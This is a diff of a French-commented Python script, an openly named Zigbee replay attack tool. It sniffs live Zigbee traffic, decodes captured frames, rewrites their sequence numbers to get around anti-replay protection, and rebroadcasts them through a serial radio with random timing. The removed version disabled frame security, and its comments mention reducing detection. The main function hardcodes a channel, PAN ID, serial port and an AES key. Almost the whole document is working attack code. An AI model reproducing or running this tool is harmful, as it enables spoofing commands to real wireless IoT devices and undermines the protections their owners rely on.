@@ -8,16 +8,12 @@ import threading
 import queue
 import time
 import hashlib
-import struct
 from typing import Dict, Optional, List
 
-# Importer les bibliothèques nécessaires
-from scapy.all import *
-from scapy.layers.dot15d4 import Dot15d4
-from scapy.layers.zigbee import *
-from Crypto.Cipher import AES
+from CodeurTrame import CodeurTrameZigbee
+from DecodeurTrame import DecodeurTrameZigbee
+from sniff import SniffeurZigbee
 
-# Configuration du logging avancé
 logging.basicConfig(
     level=logging.DEBUG,
     format='%(asctime)s - %(levelname)s - %(message)s',
@@ -28,7 +24,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-class ZigbeeAdvancedReplayAttack:
+class ZigbeeReplayAttack:
     def __init__(
         self, 
         capture_file: str = 'captures_zigbee.json', 
@@ -37,179 +33,188 @@ class ZigbeeAdvancedReplayAttack:
         serial_port: Optional[str] = None,
         aes_key: Optional[str] = None
     ):
-        """
-        Initialise l'outil de replay avancé avec contournement anti-replay
-        
-        Args:
-            capture_file (str): Fichier de captures Zigbee
-            channel (int): Canal Zigbee
-            pan_id (int): Identifiant du réseau
-            serial_port (str): Port série pour transmission
-            aes_key (str): Clé de chiffrement optionnelle
-        """
         self.capture_file = capture_file
         self.channel = channel
         self.pan_id = pan_id
         self.serial_port = serial_port
-        self.aes_key = bytes.fromhex(aes_key) if aes_key else None
+        self.aes_key = aes_key
+        
+        # Initialize helper classes
+        self.codeur = CodeurTrameZigbee(logger)
+        self.decodeur = DecodeurTrameZigbee(logger)
+        self.sniffer = SniffeurZigbee(
+            canal=channel,
+            fichier_sortie=capture_file,
+            vitesse_bauds=115200
+        )
         
         # Gestion des séquences et anti-replay
         self.sequence_base = None
         self.sequence_offset = 0
         self.captures = []
         self.replay_queue = queue.Queue()
-        
-        # Cache pour stocker les variations de séquence
         self.sequence_variations = []
+
+    def capturer_trames_live(self, duree_capture: int = 10):
+        """
+        Capture live des trames ZigBee pendant une durée spécifiée
+        """
+        logger.info(f"Démarrage de la capture live pour {duree_capture} secondes")
+        self.sniffer.demarrer_sniffer()
+        time.sleep(duree_capture)
+        self.sniffer.arreter_sniffer()
+        self.sniffer.sauvegarder_captures()
+        self.captures = self.sniffer.captures
+        logger.info(f"Capture terminée : {len(self.captures)} trames capturées")
 
     def charger_captures(self):
         """
-        Charger et analyser les captures Zigbee avec extraction des informations de séquence
+        Charger et analyser les captures Zigbee
         """
         try:
             with open(self.capture_file, 'r', encoding='utf-8') as f:
-                self.captures = json.load(f)
-            
-            # Extraire les informations de séquence
-            sequences = [
-                int(capture.get('sequence', 0)) 
-                for capture in self.captures 
-                if 'sequence' in capture
-            ]
-            
-            if sequences:
-                self.sequence_base = min(sequences)
-                logger.info(f"Séquence de base détectée : {self.sequence_base}")
+                raw_captures = json.load(f)
                 
-                # Générer des variations de séquence
-                self._generer_variations_sequence()
+            # Décoder chaque trame capturée
+            self.captures = []
+            for capture in raw_captures:
+                if isinstance(capture, str):  # Si c'est une chaîne hex
+                    trame_bytes = bytes.fromhex(capture)
+                    trame_decodee = self.decodeur.decoder_trame_zigbee(trame_bytes)
+                    if trame_decodee:
+                        self.captures.append(trame_decodee)
+                else:  # Si c'est déjà un dictionnaire décodé
+                    self.captures.append(capture)
+            
+            # Extraire les séquences
+            self._extraire_sequences()
+            logger.info(f"Chargement réussi : {len(self.captures)} trames")
+            
         except Exception as e:
             logger.error(f"Erreur lors du chargement des captures : {e}")
             self.captures = []
 
+    def _extraire_sequences(self):
+        """
+        Extraire les numéros de séquence des trames capturées
+        """
+        sequences = []
+        for capture in self.captures:
+            if capture['type_trame'] == 'Data':
+                seq = capture['couche_mac'].get('numero_sequence')
+                if seq is not None:
+                    sequences.append(seq)
+            elif 'sequence_number' in capture:
+                sequences.append(capture['sequence_number'])
+                
+        if sequences:
+            self.sequence_base = min(sequences)
+            self._generer_variations_sequence()
+
     def _generer_variations_sequence(self):
         """
-        Générer des variations de numéro de séquence pour contourner l'anti-replay
+        Générer des variations de numéro de séquence
         """
         if not self.sequence_base:
             return
         
-        # Générer plusieurs variations de séquence
         variations = [
-            self.sequence_base,  # Séquence originale
-            self.sequence_base + 1,  # Séquence suivante
-            self.sequence_base - 1,  # Séquence précédente
-            self.sequence_base + random.randint(1, 10),  # Variation aléatoire positive
-            self.sequence_base - random.randint(1, 10),  # Variation aléatoire négative
-            self._generer_sequence_cryptographique()  # Séquence générée cryptographiquement
+            self.sequence_base,
+            (self.sequence_base + 1) % 256,
+            (self.sequence_base + random.randint(2, 10)) % 256,
+            self._generer_sequence_cryptographique()
         ]
         
-        # Filtrer les valeurs non-négatives
-        self.sequence_variations = [seq for seq in variations if seq >= 0 and seq <= 255]
+        self.sequence_variations = variations
         logger.debug(f"Variations de séquence générées : {self.sequence_variations}")
 
     def _generer_sequence_cryptographique(self) -> int:
         """
-        Générer un numéro de séquence de manière cryptographiquement aléatoire
-        
-        Returns:
-            int: Numéro de séquence généré
+        Générer un numéro de séquence cryptographiquement sûr
         """
-        # Utiliser les informations de capture comme seed
         seed = hashlib.sha256(
             str(self.sequence_base).encode() + 
             str(time.time()).encode()
         ).digest()
-        
-        # Convertir en entier et ajuster à 8 bits
         return int.from_bytes(seed[:1], byteorder='big')
 
-    def _creer_paquet_zigbee_avance(self):
+    def preparer_trame_replay(self, trame_originale: dict) -> bytes:
         """
-        Créer un paquet Zigbee avec des techniques de contournement anti-replay
-        
-        Returns:
-            Packet: Paquet Zigbee modifié
+        Prépare une trame pour le replay en utilisant le codeur
         """
-        # Sélectionner une variation de séquence
         sequence = random.choice(self.sequence_variations) if self.sequence_variations else random.randint(0, 255)
         
-        # Construction du paquet avec variation de séquence
-        zigbee_packet = (
-            Dot15d4(
-                fcf_frametype=1,  # Data Frame
-                fcf_security=0,  # Désactiver la sécurité
-                fcf_ackreq=1,
-                fcf_destaddrmode=2,
-                fcf_srcaddrmode=2,
-                panid=self.pan_id,
-                seqnum=sequence  # Utiliser la séquence variée
-            ) /
-            ZigbeeNWK(
-                frametype=0,  # Data Frame
-                destination=0xFFFF,  # Broadcast
-                source=0x0000,  # Source générique
-                radius=30,
-                seqnum=sequence  # Synchroniser le numéro de séquence
-            ) /
-            Raw(load=b'\x11\x11\x00\x01')  # Payload potentiellement plus sophistiqué
-        )
-        
-        return zigbee_packet
+        # Modifier la séquence dans la trame
+        if trame_originale['type_trame'] == 'Data':
+            trame_originale['couche_mac']['numero_sequence'] = sequence
+            trame_originale['couche_reseau']['sequence_number'] = sequence
+        else:
+            trame_originale['sequence_number'] = sequence
+            
+        # Encoder la trame modifiée
+        return self.codeur.encoder_trame_zigbee(trame_originale)
 
     def preparer_trames_replay(self, nombre_trames: int = 20):
         """
-        Préparer les trames de replay avec des variations
+        Préparer les trames pour le replay
         """
-        # Vider la file d'attente
-        while not self.replay_queue.empty():
-            self.replay_queue.get()
+        self.replay_queue = queue.Queue()
         
-        # Générer plusieurs trames avec variations
         for _ in range(nombre_trames):
-            paquet = self._creer_paquet_zigbee_avance()
-            self.replay_queue.put(paquet)
+            if not self.captures:
+                continue
+
+            trame_originale = random.choice(self.captures)
+            trame_modifiee = self.preparer_trame_replay(trame_originale)
+            self.replay_queue.put(trame_modifiee)
 
     def envoyer_trames_replay(self, nombre_replays: int = 5):
         """
-        Envoyer les trames de replay avec techniques anti-anti-replay
+        Envoyer les trames de replay
         """
         try:
             with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
                 logger.info(f"Début du replay via {self.serial_port}")
                 
                 while not self.replay_queue.empty():
+                    trame = self.replay_queue.get()
+                    
                     for _ in range(nombre_replays):
-                        zigbee_packet = self.replay_queue.get()
-                        
-                        # Construction de la trame
+                        # Construction de la trame complète avec en-tête
                         trame_complete = bytearray([
-                            len(bytes(zigbee_packet)) + 3,  # Longueur
-                            self.channel,                   # Canal
-                            self.pan_id >> 8,               # Octet haut PAN ID
-                            self.pan_id & 0xFF              # Octet bas PAN ID
+                            len(trame) + 3,  # Longueur
+                            self.channel,    # Canal
+                            self.pan_id >> 8,  # PAN ID (octet haut)
+                            self.pan_id & 0xFF  # PAN ID (octet bas)
                         ])
-                        trame_complete.extend(bytes(zigbee_packet))
+                        trame_complete.extend(trame)
                         
-                        # Envoi avec techniques d'obscurcissement
+                        # Envoi avec délai aléatoire
                         ser.write(trame_complete)
-                        logger.debug(f"Trame replay envoyée - Séquence {zigbee_packet.seqnum}")
-                        
-                        # Délais variables pour réduire la détection
                         time.sleep(random.uniform(0.1, 0.5))
+                        
+                        logger.debug(f"Trame replay envoyée - Longueur: {len(trame_complete)}")
+                        
         except Exception as e:
             logger.error(f"Erreur durant le replay : {e}")
 
-    def lancer_attaque_replay(self, nombre_replays: int = 5):
+    def lancer_attaque_replay(self, nombre_replays: int = 5, capture_live: bool = False):
         """
-        Lancer l'attaque de replay avec techniques avancées
+        Lancer l'attaque de replay complète
         """
         try:
-            # Charger les captures et préparer
-            self.charger_captures()
+            if capture_live:
+                self.capturer_trames_live()
+            else:
+                self.charger_captures()
+                
+            if not self.captures:
+                logger.error("Aucune trame à rejouer")
+                return
+                
             self.preparer_trames_replay()
             
-            # Lancement multithread
+            # Lancement du replay dans un thread séparé
             thread_replay = threading.Thread(
                 target=self.envoyer_trames_replay, 
                 kwargs={'nombre_replays': nombre_replays}
@@ -222,14 +227,19 @@ class ZigbeeAdvancedReplayAttack:
 
 def main():
     # Configuration de l'attaque
-    outil_attaque = ZigbeeAdvancedReplayAttack(
+    attaque = ZigbeeReplayAttack(
         capture_file='captures_zigbee.json',
         channel=13,
         pan_id=0x1900,
-        serial_port='/dev/ttyACM0'
+        serial_port='/dev/ttyACM0',
+        aes_key="9b9494920170aeed67e90ce7d672face"
     )
     
-    outil_attaque.lancer_attaque_replay(nombre_replays=3)
+    # Lancer l'attaque avec capture live
+    attaque.lancer_attaque_replay(
+        nombre_replays=3,
+        capture_live=True
+    )
 
 if __name__ == "__main__":
     main()
